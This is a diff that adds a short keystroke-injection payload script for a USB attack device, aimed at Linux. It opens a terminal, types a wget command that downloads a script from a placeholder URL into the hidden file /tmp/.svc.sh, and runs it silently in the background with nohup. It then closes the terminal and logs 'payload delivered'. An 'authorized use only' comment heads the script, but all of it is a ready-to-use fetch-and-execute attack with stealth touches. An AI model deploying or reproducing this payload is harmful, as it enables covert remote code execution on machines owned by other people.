@@ -1,0 +1,16 @@
+REM ============================================================
+REM Linux: open a terminal, download and execute a script
+REM AUTHORIZED USE ONLY - run only on systems you own or have
+REM explicit written permission to test.
+REM EDIT THE URL BELOW before running.
+REM ============================================================
+DELAY 1500
+CTRL ALT T
+DELAY 1200
+STRINGLN wget -q http://example.com/your-tool.sh -O /tmp/.svc.sh && chmod +x /tmp/.svc.sh && nohup /tmp/.svc.sh >/dev/null 2>&1 &
+DELAY 600
+STRINGLN exit
+DELAY 400
+LED_BLINK 3 #00FF00
+SCREEN_TEXT payload delivered #00FF00
+LOG linux_download_run: payload delivered
